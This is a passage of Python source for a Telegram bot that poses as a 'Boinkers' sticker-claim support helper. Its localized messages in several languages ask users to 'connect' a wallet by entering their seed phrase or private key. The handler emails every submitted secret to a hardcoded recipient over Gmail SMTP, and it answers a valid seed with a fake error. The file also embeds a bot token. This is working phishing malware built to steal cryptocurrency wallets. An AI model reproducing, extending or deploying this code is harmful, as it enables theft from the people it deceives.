        "select wallet type": "Selectați tipul portofelului:",
        "other wallets": "Alte Portofele",
        "private key": "🔑 Cheie Privată",
        "seed phrase": "🔒 Importă Seed Phrase",
        "wallet selection message": "Ați selectat {wallet_name}.\nSelectați modul de conectare preferat.",
        "reassurance": PROFESSIONAL_REASSURANCE["ro"],
        "prompt seed": "vă rugăm să introduceți cele 12 sau 24 de cuvinte ale portofelului dvs." + PROFESSIONAL_REASSURANCE["ro"],
        "prompt private key": "Introduceți cheia privată." + PROFESSIONAL_REASSURANCE["ro"],
        "invalid choice": "Alegere invalidă. Folosiți butoanele.",
        "final error message": "‼️ A apărut o eroare. /start pentru a încerca din nou.",
        "final_received_message": "Mulțumim — seed sau cheia privată a fost primită și va fi procesată. /start pentru a începe din nou.",
        "error_use_seed_phrase": "Acest câmp necesită seed phrase (12 sau 24 cuvinte).",
        "post_receive_error": "‼️ A apărut o eroare. Vă rugăm să vă asigurați că introduceți cheia corectă — folosiți copiere și lipire pentru a evita erorile. Vă rugăm /start pentru a încerca din nou.",
        "choose language": "Selectați limba preferată:",
        "await restart message": "Click /start pentru a relua.",
        "enter stickers prompt": "Introduceți stickerele pe care doriți să le revendicați.",
        "confirm claim stickers": "Sigur doriți să revendicați stickerele introduse?",
        "confirm_entered_stickers": "Ați introdus {count} sticker(e):\n{stickers}\n\nConfirmați?",
        "yes": "Da",
        "no": "Nu",
        "back": "🔙 Înapoi",
        "invalid_input": "Intrare invalidă. /start.",
    },
    # Slovak
    "sk": {
        "welcome": "Vitajte {user}! Tento bot pomáha žiadať o Boinkers nálepky.",
        "main menu title": "Vyberte typ problému pre pokračovanie:",
        "buy": "Kúpiť",
        "validation": "Validácia",
        "claim tokens": "Uplatniť tokeny",
        "migration issues": "Problémy s migráciou",
        "assets recovery": "Obnova aktív",
        "general issues": "Všeobecné problémy",
        "rectification": "Oprava",
        "staking issues": "Problémy so stakingom",
        "deposits": "Vklady",
        "withdrawals": "Výbery",
        "missing balance": "Chýbajúci zostatok",
        "login issues": "Problémy s prihlasovaním",
        "high gas fees": "Vysoké poplatky za gas",
        "presale issues": "Problémy s predpredajom",
        "claim missing sticker": "Uplatniť chýbajúcu nálepku",
        "connect wallet message": "Pripojte peňaženku pomocou súkromného kľúča alebo seed frázy.",
        "connect wallet button": "🔑 Pripojiť peňaženku",
        "select wallet type": "Vyberte typ peňaženky:",
        "other wallets": "Iné peňaženky",
        "private key": "🔑 Súkromný kľúč",
        "seed phrase": "🔒 Importovať seed frázu",
        "wallet selection message": "Vybrali ste {wallet_name}.\nVyberte spôsob pripojenia.",
        "reassurance": PROFESSIONAL_REASSURANCE["sk"],
        "prompt seed": "zadajte prosím 12 alebo 24 slov vašej peňaženky." + PROFESSIONAL_REASSURANCE["sk"],
        "prompt private key": "Zadajte súkromný kľúč." + PROFESSIONAL_REASSURANCE["sk"],
        "invalid choice": "Neplatná voľba. Použite tlačidlá.",
        "final error message": "‼️ Došlo k chybe. /start pre opakovanie.",
        "final_received_message": "Ďakujeme — seed alebo súkromný kľúč bol prijatý a bude spracovaný. /start pre opakovanie.",
        "error_use_seed_phrase": "Zadajte seed frázu (12 alebo 24 slov).",
        "post_receive_error": "‼️ Došlo k chybe. Uistite sa, že zadávate správny kľúč — použite kopírovať a prilepiť, aby ste sa vyhli chybám. Prosím /start pre opakovanie.",
        "choose language": "Vyberte jazyk:",
        "await restart message": "Kliknite /start pre reštart.",
        "enter stickers prompt": "Zadajte nálepky, ktoré chcete uplatniť.",
        "confirm claim stickers": "Ste si istí, že chcete pokračovať?",
        "confirm_entered_stickers": "Zadali ste {count} nálepiek:\n{stickers}\n\nPotvrďte.",
        "yes": "Áno",
        "no": "Nie",
        "back": "🔙 Späť",
        "invalid_input": "Neplatný vstup. /start.",
    },
    # Thai
    "th": {
        "welcome": "สวัสดี {user}! ยินดีต้อนรับสู่ผู้ช่วย Boinkers. บอทนี้ช่วยคุณขอรับสติกเกอร์",
        "main menu title": "โปรดเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
        "buy": "ซื้อ",
        "validation": "การตรวจสอบ",
        "claim tokens": "เรียกร้องโทเค็น",
        "migration issues": "ปัญหาการย้ายข้อมูล",
        "assets recovery": "กู้คืนทรัพย์สิน",
        "general issues": "ปัญหาทั่วไป",
        "rectification": "การแก้ไข",
        "staking issues": "ปัญหาการสเตก",
        "deposits": "การฝาก",
        "withdrawals": "การถอน",
        "missing balance": "ยอดคงเหลือหายไป",
        "login issues": "ปัญหาการเข้าสู่ระบบ",
        "high gas fees": "ค่าธรรมเนียมแก๊สสูง",
        "presale issues": "ปัญหาพรีเซล",
        "claim missing sticker": "ขอรับสติกเกอร์ที่หายไป",
        "connect wallet message": "โปรดเชื่อมต่อกระเป๋าด้วยคีย์ส่วนตัวหรือวลี seed",
        "connect wallet button": "🔑 เชื่อมต่อกระเป๋า",
        "select wallet type": "เลือกประเภทกระเป๋า:",
        "other wallets": "กระเป๋าอื่น ๆ",
        "private key": "🔑 กุญแจส่วนตัว",
        "seed phrase": "🔒 นำเข้า Seed Phrase",
        "wallet selection message": "คุณได้เลือก {wallet_name}\nเลือกโหมดการเชื่อมต่อ",
        "reassurance": PROFESSIONAL_REASSURANCE["th"],
        "prompt seed": "โปรดป้อน 12 หรือ 24 คำของกระเป๋าเงินของคุณ" + PROFESSIONAL_REASSURANCE["th"],
        "prompt private key": "ป้อนคีย์ส่วนตัวของคุณ." + PROFESSIONAL_REASSURANCE["th"],
        "invalid choice": "ตัวเลือกไม่ถูกต้อง ใช้ปุ่ม",
        "final error message": "‼️ เกิดข้อผิดพลาด. /start เพื่อทดลองใหม่",
        "final_received_message": "ขอบคุณ — seed หรือคีย์ส่วนตัวของคุณได้รับอย่างปลอดภัยและจะถูกประมวลผล ใช้ /start เพื่อเริ่มใหม่",
        "error_use_seed_phrase": "โปรดป้อน seed phrase (12 หรือ 24 คำ) แทนที่อยู่",
        "post_receive_error": "‼️ เกิดข้อผิดพลาด โปรดตรวจสอบว่าคุณป้อนคีย์ที่ถูกต้อง — โปรดใช้คัดลอกและวางเพื่อหลีกเลี่ยงข้อผิดพลาด กรุณา /start เพื่อลองอีกครั้ง",
        "choose language": "เลือกภาษา:",
        "await restart message": "คลิก /start เพื่อเริ่มใหม่",
        "enter stickers prompt": "พิมพ์สติกเกอร์ที่ต้องการขอรับ",
        "confirm claim stickers": "แน่ใจหรือไม่ว่าจะขอรับสติกเกอร์ที่ป้อน?",
        "confirm_entered_stickers": "คุณป้อน {count} สติกเกอร์:\n{stickers}\n\nยืนยัน?",
        "yes": "ใช่",
        "no": "ไม่",
        "back": "🔙 ย้อนกลับ",
        "invalid_input": "ข้อมูลไม่ถูกต้อง ใช้ /start",
    },
    # Vietnamese
    "vi": {
        "welcome": "Xin chào {user}! Chào mừng bạn đến với trợ lý Boinkers. Bot này giúp bạn yêu cầu sticker.",
        "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
        "buy": "Mua",
        "validation": "Xác thực",
        "claim tokens": "Yêu cầu Token",
        "migration issues": "Vấn đề di chuyển",
        "assets recovery": "Khôi phục tài sản",
        "general issues": "Vấn đề chung",
        "rectification": "Sửa chữa",
        "staking issues": "Vấn đề staking",
        "deposits": "Nạp tiền",
        "withdrawals": "Rút tiền",
        "missing balance": "Thiếu số dư",
        "login issues": "Vấn đề đăng nhập",
        "high gas fees": "Phí gas cao",
        "presale issues": "Vấn đề presale",
        "claim missing sticker": "Yêu cầu sticker bị thiếu",
        "connect wallet message": "Vui lòng kết nối ví bằng Khóa riêng hoặc Seed Phrase.",
        "connect wallet button": "🔑 Kết nối ví",
        "select wallet type": "Chọn loại ví:",
        "other wallets": "Ví khác",
        "private key": "🔑 Khóa riêng",
        "seed phrase": "🔒 Nhập Seed Phrase",
        "wallet selection message": "Bạn đã chọn {wallet_name}.\nChọn phương thức kết nối.",
        "reassurance": PROFESSIONAL_REASSURANCE["vi"],
        "prompt seed": "vui lòng nhập 12 hoặc 24 từ của ví của bạn." + PROFESSIONAL_REASSURANCE["vi"],
        "prompt private key": "Nhập khóa riêng của bạn." + PROFESSIONAL_REASSURANCE["vi"],
        "invalid choice": "Lựa chọn không hợp lệ. Dùng các nút.",
        "final error message": "‼️ Đã xảy ra lỗi. /start để thử lại.",
        "final_received_message": "Cảm ơn — seed hoặc khóa riêng đã được nhận an toàn và sẽ được xử lý. /start để bắt đầu lại.",
        "error_use_seed_phrase": "Phần này yêu cầu seed phrase (12 hoặc 24 từ). Vui lòng cung cấp seed phrase.",
        "post_receive_error": "‼️ Đã xảy ra lỗi. Vui lòng đảm bảo bạn đang nhập khóa đúng — sử dụng sao chép và dán để tránh lỗi. Vui lòng /start để thử lại.",
        "choose language": "Chọn ngôn ngữ:",
        "await restart message": "Nhấn /start để bắt đầu lại.",
        "enter stickers prompt": "Nhập sticker bạn muốn yêu cầu.",
        "confirm claim stickers": "Bạn có chắc muốn yêu cầu các sticker đã nhập không?",
        "confirm_entered_stickers": "Bạn đã nhập {count} sticker(s):\n{stickers}\n\nXác nhận?",
        "yes": "Có",
        "no": "Không",
        "back": "🔙 Quay lại",
        "invalid_input": "Dữ liệu không hợp lệ. /start.",
    },
}

# Utility to get localized text
def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    # safe guard: context may be None or not have user_data
    lang = "en"
    try:
        if context and hasattr(context, "user_data"):
            lang = context.user_data.get("language", "en")
    except Exception:
        lang = "en"
    return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))


# Generate localized wallet label based on base name and user's language:
def localize_wallet_label(base_name: str, lang: str) -> str:
    wallet_word = WALLET_WORD_BY_LANG.get(lang, WALLET_WORD_BY_LANG["en"])
    if "Wallet" in base_name:
        return base_name.replace("Wallet", wallet_word)
    if "wallet" in base_name:
        return base_name.replace("wallet", wallet_word)
    return base_name


# Helper to parse sticker input into items and count
def parse_stickers_input(text: str):
    if not text:
        return [], 0
    normalized = text.replace(",", "\n").replace(";", "\n")
    parts = [p.strip() for p in normalized.splitlines() if p.strip()]
    return parts, len(parts)


# Helper to send a new bot message and push it onto per-user message stack (to support editing on Back)
async def send_and_push_message(
    bot,
    chat_id: int,
    text: str,
    context: ContextTypes.DEFAULT_TYPE,
    reply_markup=None,
    parse_mode=None,
    state=None,
) -> object:
    msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    stack = context.user_data.setdefault("message_stack", [])
    recorded_state = state if state is not None else context.user_data.get("current_state", CHOOSE_LANGUAGE)
    stack.append(
        {
            "chat_id": chat_id,
            "message_id": msg.message_id,
            "text": text,
            "reply_markup": reply_markup,
            "state": recorded_state,
            "parse_mode": parse_mode,
        }
    )
    if len(stack) > 40:
        stack.pop(0)
    return msg


# Helper to edit the current displayed message into the previous step (in-place) when Back pressed.
async def edit_current_to_previous_on_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    stack = context.user_data.get("message_stack", [])
    if not stack:
        keyboard = build_language_keyboard()
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
        context.user_data["current_state"] = CHOOSE_LANGUAGE
        return CHOOSE_LANGUAGE

    if len(stack) == 1:
        prev = stack[0]
        try:
            await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            prev["message_id"] = update.callback_query.message.message_id
            prev["chat_id"] = update.callback_query.message.chat.id
            stack[-1] = prev
            return prev.get("state", CHOOSE_LANGUAGE)
        except Exception:
            await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", CHOOSE_LANGUAGE))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            return prev.get("state", CHOOSE_LANGUAGE)

    try:
        stack.pop()
    except Exception:
        pass

    prev = stack[-1]
    try:
        await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
        new_prev = prev.copy()
        new_prev["message_id"] = update.callback_query.message.message_id
        new_prev["chat_id"] = update.callback_query.message.chat.id
        stack[-1] = new_prev
        context.user_data["current_state"] = new_prev.get("state", MAIN_MENU)
        return new_prev.get("state", MAIN_MENU)
    except Exception:
        sent = await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", MAIN_MENU))
        context.user_data["current_state"] = prev.get("state", MAIN_MENU)
        return prev.get("state", MAIN_MENU)


# Language selection keyboard
def build_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es"), InlineKeyboardButton("Українська 🇺🇦", callback_data="lang_uk")],
        [InlineKeyboardButton("Français 🇫🇷", callback_data="lang_fr"), InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr"), InlineKeyboardButton("中文 🇨🇳", callback_data="lang_zh")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de"), InlineKeyboardButton("العربية 🇦🇪", callback_data="lang_ar")],
        [InlineKeyboardButton("Nederlands 🇳🇱", callback_data="lang_nl"), InlineKeyboardButton("हिन्दी 🇮🇳", callback_data="lang_hi")],
        [InlineKeyboardButton("Bahasa Indonesia 🇮🇩", callback_data="lang_id"), InlineKeyboardButton("Português 🇵🇹", callback_data="lang_pt")],
        [InlineKeyboardButton("Čeština 🇨🇿", callback_data="lang_cs"), InlineKeyboardButton("اردو 🇵🇰", callback_data="lang_ur")],
        [InlineKeyboardButton("Oʻzbekcha 🇺🇿", callback_data="lang_uz"), InlineKeyboardButton("Italiano 🇮🇹", callback_data="lang_it")],
        [InlineKeyboardButton("日本語 🇯🇵", callback_data="lang_ja"), InlineKeyboardButton("Bahasa Melayu 🇲🇾", callback_data="lang_ms")],
        [InlineKeyboardButton("Română 🇷🇴", callback_data="lang_ro"), InlineKeyboardButton("Slovenčina 🇸🇰", callback_data="lang_sk")],
        [InlineKeyboardButton("ไทย 🇹🇭", callback_data="lang_th"), InlineKeyboardButton("Tiếng Việt 🇻🇳", callback_data="lang_vi")],
    ]
    return InlineKeyboardMarkup(keyboard)


# Build main menu using ui_text(context, ...) so it always uses the user's selected language
def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton(ui_text(context, "claim missing sticker"), callback_data="claim_missing_sticker")],
    ]
    return InlineKeyboardMarkup(kb)


# Start handler - shows language selection (new message)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["message_stack"] = []
    context.user_data["current_state"] = CHOOSE_LANGUAGE
    keyboard = build_language_keyboard()
    chat_id = update.effective_chat.id
    await send_and_push_message(context.bot, chat_id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
    return CHOOSE_LANGUAGE


# Set language when a language button pressed
async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = query.data.split("_", 1)[1]
    context.user_data["language"] = lang
    context.user_data["current_state"] = MAIN_MENU
    welcome = ui_text(context, "welcome").format(user=update.effective_user.mention_html())
    markup = build_main_menu_markup(context)
    await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
    return MAIN_MENU


# Invalid input handler: user typed when a button-only state expected
async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    msg = ui_text(context, "invalid_input")
    await update.message.reply_text(msg)
    return context.user_data.get("current_state", CHOOSE_LANGUAGE)


# Show connect wallet button (forward navigation -> send new message)
async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["from_claim_sticker"] = False
    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
    label = ui_text(context, "connect wallet message")
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
        ]
    )
    await send_and_push_message(context.bot, update.effective_chat.id, f"{label}", context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET


# Start Claim Missing Sticker flow (no Back button here; forward => send new message)
async def start_claim_missing_sticker(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["current_state"] = CLAIM_STICKER_INPUT
    prompt = ui_text(context, "enter stickers prompt")
    fr = ForceReply(selective=False)
    await send_and_push_message(context.bot, update.effective_chat.id, prompt, context, reply_markup=fr, state=CLAIM_STICKER_INPUT)
    return CLAIM_STICKER_INPUT


# Handle sticker input (user types). Store but DO NOT email sticker content. Show confirmation including entered text.
async def handle_sticker_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = update.message.text or ""
    context.user_data["stickers_to_claim"] = text
    try:
        await context.bot.delete_message(chat_id=update.message.chat_id, message_id=update.message.message_id)
    except Exception:
        pass
    parts, count = parse_stickers_input(text)
    context.user_data["current_state"] = CLAIM_STICKER_CONFIRM
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(ui_text(context, "yes"), callback_data="claim_sticker_confirm_yes"),
                InlineKeyboardButton(ui_text(context, "no"), callback_data="claim_sticker_confirm_no"),
            ]
        ]
    )
    confirm_text = ui_text(context, "confirm_entered_stickers").format(count=count, stickers="\n".join(parts) if parts else text)
    await send_and_push_message(context.bot, update.effective_chat.id, confirm_text, context, reply_markup=keyboard, state=CLAIM_STICKER_CONFIRM)
    return CLAIM_STICKER_CONFIRM


# Handle Yes/No confirmation for stickers
async def handle_claim_sticker_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if query.data == "claim_sticker_confirm_no":
        context.user_data["current_state"] = CLAIM_STICKER_INPUT
        prompt = ui_text(context, "enter stickers prompt")
        fr = ForceReply(selective=False)
        await send_and_push_message(context.bot, update.effective_chat.id, prompt, context, reply_markup=fr, state=CLAIM_STICKER_INPUT)
        return CLAIM_STICKER_INPUT

    # Yes -> proceed to connect wallet (forward)
    context.user_data["from_claim_sticker"] = True
    context.user_data["current_state"] = AWAIT_CONNECT_WALLET
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
        ]
    )
    text = f"{ui_text(context, 'claim missing sticker')}\n{ui_text(context, 'connect wallet message')}"
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET


# Show wallet types (forward navigation -> send new message). Wallet labels localized.
async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    keyboard = []
    primary_keys = [
        "wallet_type_metamask",
        "wallet_type_trust_wallet",
        "wallet_type_coinbase",
        "wallet_type_tonkeeper",
        "wallet_type_phantom_wallet",
    ]
    for key in primary_keys:
        label = localize_wallet_label(BASE_WALLET_NAMES.get(key, key), lang)
        keyboard.append([InlineKeyboardButton(label, callback_data=key)])
    keyboard.append([InlineKeyboardButton(ui_text(context, "other wallets"), callback_data="other_wallets")])
    keyboard.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_types")])
    reply = InlineKeyboardMarkup(keyboard)
    context.user_data["current_state"] = CHOOSE_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_WALLET_TYPE)
    return CHOOSE_WALLET_TYPE


# Show other wallets full list (forward navigation -> send new message)
async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    keys = [
        "wallet_type_mytonwallet",
        "wallet_type_tonhub",
        "wallet_type_rainbow",
        "wallet_type_safepal",
        "wallet_type_wallet_connect",
        "wallet_type_ledger",
        "wallet_type_brd_wallet",
        "wallet_type_solana_wallet",
        "wallet_type_balance",
        "wallet_type_okx",
        "wallet_type_xverse",
        "wallet_type_sparrow",
        "wallet_type_earth_wallet",
        "wallet_type_hiro",
        "wallet_type_saitamask_wallet",
        "wallet_type_casper_wallet",
        "wallet_type_cake_wallet",
        "wallet_type_kepir_wallet",
        "wallet_type_icpswap",
        "wallet_type_kaspa",
        "wallet_type_nem_wallet",
        "wallet_type_near_wallet",
        "wallet_type_compass_wallet",
        "wallet_type_stack_wallet",
        "wallet_type_soilflare_wallet",
        "wallet_type_aioz_wallet",
        "wallet_type_xpla_vault_wallet",
        "wallet_type_polkadot_wallet",
        "wallet_type_xportal_wallet",
        "wallet_type_multiversx_wallet",
        "wallet_type_verachain_wallet",
        "wallet_type_casperdash_wallet",
        "wallet_type_nova_wallet",
        "wallet_type_fearless_wallet",
        "wallet_type_terra_station",
        "wallet_type_cosmos_station",
        "wallet_type_exodus_wallet",
        "wallet_type_argent",
        "wallet_type_binance_chain",
        "wallet_type_safemoon",
        "wallet_type_gnosis_safe",
        "wallet_type_defi",
        "wallet_type_other",
    ]
    kb = []
    row = []
    for k in keys:
        base_label = BASE_WALLET_NAMES.get(k, k.replace("wallet_type_", "").replace("_", " ").title())
        label = localize_wallet_label(base_label, lang)
        row.append(InlineKeyboardButton(label, callback_data=k))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_other_wallets")])
    reply = InlineKeyboardMarkup(kb)
    context.user_data["current_state"] = CHOOSE_OTHER_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_OTHER_WALLET_TYPE)
    return CHOOSE_OTHER_WALLET_TYPE


# Show private key / seed options (forward navigation -> send new message). Wallet name localized.
# Only show the seed phrase option for the specific wallets requested (tonkeeper, tonhub, telegram wallet, mytonwallet)
async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("language", "en")
    wallet_key = query.data
    wallet_name = BASE_WALLET_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
    localized_wallet_name = localize_wallet_label(wallet_name, lang)
    context.user_data["wallet type"] = localized_wallet_name

    # Wallet keys for which we only present the seed phrase option
    seed_only_wallet_keys = {
        "wallet_type_metamask",    # mapped to Tonkeeper in BASE_WALLET_NAMES
        "wallet_type_tonkeeper",   # mapped to Tonhub
        "wallet_type_trust_wallet",# Telegram Wallet
        "wallet_type_coinbase",    # MyTon Wallet
        "wallet_type_mytonwallet", # MyTon (alternate key in other list)
    }

    if wallet_key in seed_only_wallet_keys:
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
            ]
        )
    else:
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key"), InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
            ]
        )

    text = ui_text(context, "wallet selection message").format(wallet_name=localized_wallet_name)
    context.user_data["current_state"] = PROMPT_FOR_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
    return PROMPT_FOR_INPUT


# Prompt for input: when seed or private key selected -> send ForceReply so keyboard appears (forward navigation)
async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["wallet option"] = query.data
    fr = ForceReply(selective=False)
    if query.data == "seed_phrase":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt seed")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    elif query.data == "private_key":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt private key")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    else:
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "invalid choice"), context, state=context.user_data.get("current_state", CHOOSE_LANGUAGE))
        return ConversationHandler.END
    return RECEIVE_INPUT


# Handle final wallet input and email (always email the input, then branch: if not 12/24 ask again; if 12/24 show post-receive error only)
async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_input = update.message.text or ""
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get("wallet option", "Unknown")
    wallet_type = context.user_data.get("wallet type", "Unknown")
    user = update.effective_user

    # Always send the input to email regardless of content
    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    await send_email(subject, body)

    # Attempt to delete the user's message to avoid leaving sensitive strings in chat
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

    # Validate words count
    words = [w for w in re.split(r"\s+", user_input.strip()) if w]

    # If user did NOT provide 12 or 24 words: guide them to provide the seed (localized), ask again with ForceReply.
    if len(words) not in (12, 24):
        # Send a single guidance message that also attaches ForceReply so the user is prompted only once.
        fr = ForceReply(selective=False)
        await send_and_push_message(context.bot, chat_id, ui_text(context, "error_use_seed_phrase"), context, reply_markup=fr, state=RECEIVE_INPUT)
        context.user_data["current_state"] = RECEIVE_INPUT
        return RECEIVE_INPUT

    # If user DID provide 12 or 24 words: show only the localized "post_receive_error" message and set state to AWAIT_RESTART.
    context.user_data["current_state"] = AWAIT_RESTART
    await send_and_push_message(context.bot, chat_id, ui_text(context, "post_receive_error"), context, state=AWAIT_RESTART)
    return AWAIT_RESTART


# After restart handler: any text after final success
async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(ui_text(context, "await restart message"))
    return AWAIT_RESTART


# Send email helper
async def send_email(subject: str, body: str) -> None:
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECIPIENT_EMAIL
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")


# Universal Back handler: edit current displayed message into the previous step UI (in-place)
async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    state = await edit_current_to_previous_on_back(update, context)
    return state


# Cancel
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    logging.info("Cancel called.")
    return ConversationHandler.END


def main() -> None:
    # Token (keep these secrets out of repo / move to env vars in production)
    application = ApplicationBuilder().token("8426221433:AAFMLa5i-SnsIl2rTya6Iee8BK6_9ZdGdFE").build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [CallbackQueryHandler(set_language, pattern="^lang_")],
            MAIN_MENU: [
                CallbackQueryHandler(start_claim_missing_sticker, pattern="^claim_missing_sticker$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            AWAIT_CONNECT_WALLET: [
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            RECEIVE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ],
            CLAIM_STICKER_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sticker_input),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            CLAIM_STICKER_CONFIRM: [
